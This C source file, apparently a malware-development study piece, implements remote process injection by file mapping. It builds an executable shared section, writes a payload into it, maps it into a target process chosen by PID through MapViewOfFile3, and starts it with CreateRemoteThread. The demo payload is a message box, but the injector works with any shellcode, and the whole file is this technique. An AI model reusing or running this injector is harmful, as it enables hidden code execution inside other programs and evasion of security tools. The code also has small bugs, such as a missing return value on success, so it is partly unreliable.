/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Notes : base payload injection using mapping method
 */

#include "mapinject.h"
#include <tlhelp32.h>

/**
 * MapViewOfFile3 definition.
 */
typedef PVOID (NTAPI *PMAPVIEWOFFILE3)(
    HANDLE FileMapping,
    HANDLE Process,
    ULONG64 BaseAddress,
    PVOID Offset,
    SIZE_T ViewSize,
    ULONG AllocationType,
    ULONG PageProtection,
    MEM_EXTENDED_PARAMETER *ExtendedParameters,
    ULONG ParameterCount
);


/**
 * Get ptr to MapViewOfFile3 function from kernel32
 */
PMAPVIEWOFFILE3 GetMapViewOfFileAddr(){
    HMODULE         hLib = NULL;
    PMAPVIEWOFFILE3 ptr  = NULL;

    hLib = GetModuleHandleW(L"kernelbase.dll");
    if(hLib == NULL){
        printf("[!] Error getting handle to kernelbase.dll with error : %d \n", GetLastError());
        return NULL;
    }

    ptr = (PMAPVIEWOFFILE3)GetProcAddress(hLib, "MapViewOfFile3");
    if(ptr == NULL){
        printf("[!] Unable to get address of MapViewOfFile2 function with error : %d \n", GetLastError());
        return NULL;
    }
    
    return ptr;
}

/**
 * Remote map injection
 * 
 * @param hProcess => handle to a given process
 * @param pPayload => ptr to payload
 * @param sPayloadSize => size of payload
 * @param pAddress => address of written payload.
 */
BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* pAddress){
    BOOL   STATE                      = TRUE;
    HANDLE hFile                      = NULL;
    PVOID  pMapLocalAddress           = NULL;
    PVOID  pMapRemoteAddress          = NULL;
    PMAPVIEWOFFILE3 pMapViewOfFile3   = NULL;

    pMapViewOfFile3 = GetMapViewOfFileAddr();

    if(pMapViewOfFile3 == NULL){
        return FALSE;
    }

    hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if(hFile == NULL){
        printf("[!] Error calling CreateFileMapping function with error : %d \n", GetLastError());
        return FALSE;
    }

    pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		STATE = FALSE; goto _EndFunc;
	}

    printf("[*] Local mapping address : 0x%p \n", pMapLocalAddress);
	printf("[*] Press <Enter> To Write The Payload ... ");
	getchar();

	printf("[*] Copying payload to 0x%p ... ", pMapLocalAddress);
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);
	printf("[*] DONE \n");

    pMapRemoteAddress = pMapViewOfFile3(hFile, hProcess, NULL, 0, 0, 0, PAGE_EXECUTE_READWRITE, NULL, 0);
    if(pMapRemoteAddress == NULL){
        printf("[!] MapViewOfFile3 failed with error : %d \n", GetLastError());
		STATE = FALSE; goto _EndFunc;
    }

	printf("[*] Remote mapping address : 0x%p \n", pMapRemoteAddress);

_EndFunc:
    *pAddress = pMapRemoteAddress;
    if(hFile){
        CloseHandle(hFile);
    }
}

//test.
int main(int argc, char* argv[]){
    HANDLE hProcess   = NULL;
    HANDLE hThread    = NULL;

    PVOID pAddress    = NULL;
    DWORD dwProcessId = NULL;

    if(argc != 2){
        printf("[!] Usage : \"%s\" <Process ID> \n", argv[0]);
        return EXIT_FAILURE;
    }

    dwProcessId = atoi(argv[1]);

    //handle to process.
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if(hProcess == NULL){
        printf("[!] Unable to to get handle to process with PID : %i \n", dwProcessId);
        return FALSE;
    }

	printf("[*] DONE \n");
	printf("[*] Found target process with pid: %d \n", dwProcessId);

    printf("[*] Injecting target process ... \n");
	if (!RemoteMapInject(hProcess, MessageBoxAPayload, sizeof(MessageBoxAPayload), &pAddress)) {
		printf("[!] FAILED \n");
		return EXIT_FAILURE;
	}
	printf("[+] DONE \n");

    printf("[*] Press <Enter> To Run The Payload ... ");
	getchar();

	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
	if (hThread == NULL){
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
    }

    printf("[*] Successfully inject payload into process.\n");
    WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

_EndFunc:
    if(hThread){
        CloseHandle(hThread);
    }

    if(hProcess){
        CloseHandle(hProcess);
    }

    return EXIT_SUCCESS;
}